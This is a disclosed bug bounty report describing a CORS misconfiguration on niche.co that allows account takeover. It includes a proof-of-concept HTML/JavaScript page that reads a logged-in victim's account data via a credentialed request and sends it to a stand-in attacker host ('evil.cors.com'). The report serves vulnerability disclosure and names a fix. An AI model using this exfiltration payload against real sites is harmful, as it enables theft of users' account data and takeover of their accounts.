# CORS misconfig | Account Takeover

## Report Details
- **Report ID**: 426147
- **URL**: https://hackerone.com/reports/426147
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-10-20T11:17:55.552Z
- **Disclosed**: 2018-12-10T18:28:33.696Z

## Reporter
- **Username**: nahoragg
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:** 
CORS misconfig is found on niche.co as Access-Control-Allow-Origin is dynamically fetched from client Origin header with **credential true** and **different methods are enabled** as well.

**Description:**
Basically, the application was only checking whether "//niche.co" was in the Origin header, that means i can give anything containing that. For ex : "https://niche.co.evil.net", "https://niche.com", i can even change the protocol like http, ftp, file etc. F363563: cors_1.png

## Steps To Reproduce:
Exploit:
Host this code on a domain(http://niche.co.evil.net) or any other that contains "//niche.co".
```
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
As soon as victim visit this malicious page, his details will be fetched from his current session and sent to attacker's domain where it can be logged or saved. F363586: cors_3.png F363564: cors_2.png

## How to fix

Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

## Supporting Material/References:

https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
https://ejj.io/misconfigured-cors/

## Impact

Using this misconfig, attacker can do many actions depending on the functionality of application which in this case use **API** and do activities like:
1) Read, Update, Delete Users information(Email,Location,Bio etc)
2) Stealing Authenticity_token(CSRF) 
3) Delete social accounts on niche
4) **View private posts of social accounts**
5) Close account
6) Logout etc.

## Attachments
- cors_1.png
- cors_2.png
- cors_3.png
